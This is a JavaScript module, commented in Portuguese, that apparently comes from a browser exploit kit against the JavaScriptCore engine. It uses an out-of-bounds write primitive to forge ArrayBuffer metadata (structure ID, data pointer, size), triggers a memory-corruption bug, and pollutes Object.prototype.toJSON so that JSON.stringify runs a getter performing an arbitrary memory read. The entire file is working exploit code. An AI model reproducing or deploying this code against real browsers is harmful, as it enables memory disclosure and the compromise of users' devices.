// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let currentReadTarget = null; // { address: AdvancedInt64, size: int }
let retype_leak_attempt_results = {}; // Será resetado a cada chamada

class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0;
    }
}

function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        for (const prop in this) {
            if (Object.prototype.hasOwnProperty.call(this, prop) || CheckpointObjectForRetype.prototype.hasOwnProperty(prop)) {
                if (prop === GETTER_CHECKPOINT_PROPERTY_NAME) {
                    logS3(`toJSON: Acessando propriedade getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
                    // Acessar a propriedade para acionar o getter
                    const val = this[GETTER_CHECKPOINT_PROPERTY_NAME];
                    returned_payload[prop] = `Getter Invoked, returned: ${String(val)}`;
                } else {
                    // returned_payload[prop] = String(this[prop]); // Opcional, pode ser ruidoso
                }
            }
        }
    } catch (e) {
        logS3(`toJSON: Erro ao processar this: ${e.message}`, "error", FNAME_toJSON);
        returned_payload.error_in_toJSON = e.message;
    }
    return returned_payload;
}

function RetypeCheckpointGetter() {
    const FNAME_Getter = "RetypeCheckpointGetter";
    logS3(`!!! ${FNAME_Getter} ACIONADO !!! Tentando ler de: ${currentReadTarget.address.toString(true)} (tamanho: ${currentReadTarget.size})`, "good", FNAME_Getter);
    retype_leak_attempt_results = { success: false, value_read: null, error: null, getter_called: true };

    try {
        if (!oob_array_buffer_real) {
            throw new Error("oob_array_buffer_real não está inicializado no getter.");
        }
        if (!currentReadTarget) {
            throw new Error("currentReadTarget não definido no getter.");
        }

        // A mágica acontece aqui: esperamos que oob_array_buffer_real
        // seja interpretado com os metadados "sombra" que escrevemos.
        const dv = new DataView(oob_array_buffer_real);

        if (dv.byteLength !== currentReadTarget.size) {
            logS3(`AVISO no Getter: dv.byteLength (${dv.byteLength}) !== tamanho esperado (${currentReadTarget.size}). A re-tipagem pode ter falhado ou sido parcial.`, "warn", FNAME_Getter);
            // Mesmo que o tamanho não seja o esperado, a leitura no offset 0 pode funcionar se o data_ptr foi re-tipado
        } else {
            logS3(`SUCESSO no Getter: dv.byteLength (${dv.byteLength}) corresponde ao tamanho esperado.`, "good", FNAME_Getter);
        }

        // Tenta ler os dados
        if (currentReadTarget.size === 1) retype_leak_attempt_results.value_read = dv.getUint8(0);
        else if (currentReadTarget.size === 2) retype_leak_attempt_results.value_read = dv.getUint16(0, true); // Assumindo little-endian
        else if (currentReadTarget.size === 4) retype_leak_attempt_results.value_read = dv.getUint32(0, true);
        else if (currentReadTarget.size === 8) {
            const low = dv.getUint32(0, true);
            const high = dv.getUint32(4, true);
            retype_leak_attempt_results.value_read = new AdvancedInt64(low, high);
        } else {
             // Para tamanhos maiores, retornar um Uint8Array
            const buffer = new Uint8Array(currentReadTarget.size);
            for(let i=0; i<currentReadTarget.size; i++) {
                buffer[i] = dv.getUint8(i);
            }
            retype_leak_attempt_results.value_read = buffer;
        }

        retype_leak_attempt_results.success = true;
        logS3(`Getter: Leitura especulativa bem-sucedida. Valor: ${isAdvancedInt64Object(retype_leak_attempt_results.value_read) ? retype_leak_attempt_results.value_read.toString(true) : toHex(retype_leak_attempt_results.value_read)}`, "leak", FNAME_Getter);

    } catch (e) {
        logS3(`Getter: ERRO CRÍTICO durante a tentativa de leitura: ${e.message}`, "critical", FNAME_Getter);
        console.error(e);
        retype_leak_attempt_results.error = e.message;
        retype_leak_attempt_results.success = false;
    }
    return "GetterForRetypeCheck_Processed";
}

async function triggerRetypeMechanism() {
    const FNAME_Trigger = "triggerRetypeMechanism";
    logS3("Acionando mecanismo de re-tipagem (Heisenbug)...", "info", FNAME_Trigger);
    // Esta é a escrita que aciona o Heisenbug
    oob_write_absolute(OOB_CONFIG.HEISENBUG_TRIGGER_OFFSET, OOB_CONFIG.HEISENBUG_TRIGGER_VALUE, 4);
    logS3(`Escrito ${toHex(OOB_CONFIG.HEISENBUG_TRIGGER_VALUE)} em offset absoluto ${toHex(OOB_CONFIG.HEISENBUG_TRIGGER_OFFSET)} (Heisenbug Trigger).`, "info", FNAME_Trigger);

    // Uma pequena pausa pode ser necessária para o estado se propagar em alguns casos
    await PAUSE_S3(SHORT_PAUSE_S3);
}

export async function read_arbitrary_via_retype(addressToRead, sizeToRead) {
    const FNAME_READ_ARB = "read_arbitrary_via_retype";
    logS3(`Tentando leitura arbitrária de ${addressToRead.toString(true)} (tamanho: ${sizeToRead})`, "test", FNAME_READ_ARB);

    retype_leak_attempt_results = { success: false, value_read: null, error: null, getter_called: false }; // Reset
    currentReadTarget = { address: addressToRead, size: sizeToRead };

    let originalToJSONProtoDesc = null;
    let toJSONPollutionApplied = false;
    let originalGetterDesc = null;
    let getterPollutionApplied = false;
    const ppKey_val = "toJSON";

    try {
        await triggerOOB_primitive(); // Garante que o ambiente OOB está pronto

        // Configurar os metadados "sombra" no oob_array_buffer_real
        // Estes offsets são relativos ao início do oob_array_buffer_real (offset 0)
        // Os offsets JSC_OFFSETS.ArrayBuffer.* são do *início do objeto JSArrayBuffer*
        // Se StructureID for 2, o motor pode reconhecê-lo.
        // IMPORTANTE: Validar estes offsets (STRUCTURE_ID, DATA_POINTER_COPY, SIZE_IN_BYTES) para o seu alvo!
        const shadow_structure_id_val = JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || 2; // Default para 2 se não definido
        const shadow_structure_id_offset = 0x0; // Espera-se que seja o início do JSCell (Butterfly/GC Header)

        // Ponteiro da Estrutura - PRECISA ser válido ou zero se o StructureID for suficiente.
        // Normalmente, o JSCell header (8 bytes) é [ butterfly_ptr | structure_id_val ] ou [ cell_flags | structure_id_val ]
        // ou [ cell_flags | padding | structure_ptr ]
        // Assumindo que o StructureID inline é suficiente (modelo mais antigo) ou que o Structure Pointer está em +0x8 do JSCell
        const shadow_structure_ptr_val = new AdvancedInt64(0,0); // Tentar com StructureID apenas, ou um ponteiro válido se necessário
        const shadow_structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // Normalmente 0x8

        // Os offsets para m_dataPointer e m_sizeInBytes são relativos ao INÍCIO DO OBJETO JSArrayBuffer,
        // não ao início do oob_array_buffer_real onde estamos escrevendo.
        // Se oob_array_buffer_real[0] é tratado como o JSArrayBuffer:
        const shadow_data_ptr_val = addressToRead; // O endereço que queremos ler
        const shadow_data_ptr_config_offset = JSC_OFFSETS.ArrayBuffer?.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START || 0x20;

        const shadow_size_val = sizeToRead;
        const shadow_size_config_offset = JSC_OFFSETS.ArrayBuffer?.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18;

        logS3(`  Escrevendo metadados sombra: StructureID=${shadow_structure_id_val} em ${toHex(shadow_structure_id_offset)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_structure_id_offset, shadow_structure_id_val, 4); // Assumindo StructureID é 4 bytes

        logS3(`  Escrevendo metadados sombra: StructurePtr=${shadow_structure_ptr_val.toString(true)} em ${toHex(shadow_structure_ptr_offset)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_structure_ptr_offset, shadow_structure_ptr_val, 8); // Ponteiro é 8 bytes

        logS3(`  Escrevendo metadados sombra: DataPtr=${shadow_data_ptr_val.toString(true)} em ${toHex(shadow_data_ptr_config_offset)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_data_ptr_config_offset, shadow_data_ptr_val, 8);

        logS3(`  Escrevendo metadados sombra: Size=${toHex(shadow_size_val)} em ${toHex(shadow_size_config_offset)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_size_config_offset, shadow_size_val, 4); // Tamanho geralmente 4 ou 8 bytes, assumindo 4

        // Poluir Object.prototype.toJSON
        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerRetypeCheckpointGetter,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        // Poluir o getter no protótipo do CheckpointObjectForRetype
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: RetypeCheckpointGetter, // Nosso getter que tenta a leitura
            configurable: true, enumerable: false
        });
        getterPollutionApplied = true;

        // Acionar o Heisenbug
        await triggerRetypeMechanism();

        // Chamar JSON.stringify no objeto checkpoint para acionar a cadeia de getters
        const checkpoint_obj = new CheckpointObjectForRetype(Date.now());
        logS3("Chamando JSON.stringify(checkpoint_obj) para acionar o getter...", "info", FNAME_READ_ARB);
        const jsonResult = JSON.stringify(checkpoint_obj);
        logS3(`JSON.stringify(checkpoint_obj) retornou: ${jsonResult.length > 200 ? jsonResult.substring(0,200) + "..." : jsonResult}`, "info", FNAME_READ_ARB);

        await PAUSE_S3(SHORT_PAUSE_S3); // Dar tempo para logs e qualquer processamento assíncrono

    } catch (e) {
        logS3(`ERRO em ${FNAME_READ_ARB}: ${e.message}`, "error", FNAME_READ_ARB);
        console.error(e);
        retype_leak_attempt_results.error = e.message;
        retype_leak_attempt_results.success = false;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
            if (originalGetterDesc) Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
            else delete CheckpointObjectForRetype.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
        }
        // Não limpar o ambiente OOB aqui, pois pode ser usado por chamadas subsequentes
    }

    if (retype_leak_attempt_results.getter_called) {
        if (retype_leak_attempt_results.success) {
            logS3("SUCESSO ESPECULATIVO: Leitura arbitrária via oob_array_buffer_real re-tipado parece ter funcionado!", "vuln", FNAME_READ_ARB);
        } else {
            logS3("Getter foi chamado, mas a tentativa de leitura arbitrária falhou ou não foi bem-sucedida.", "warn", FNAME_READ_ARB);
        }
    } else {
        logS3("Getter NÃO foi chamado. A tentativa de re-tipagem não pôde ser verificada/acionada.", "error", FNAME_READ_ARB);
    }
    logS3(`  Resultado da tentativa de leitura: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_READ_ARB);
    return retype_leak_attempt_results; // Retorna o objeto com { success, value_read, error, getter_called }
}
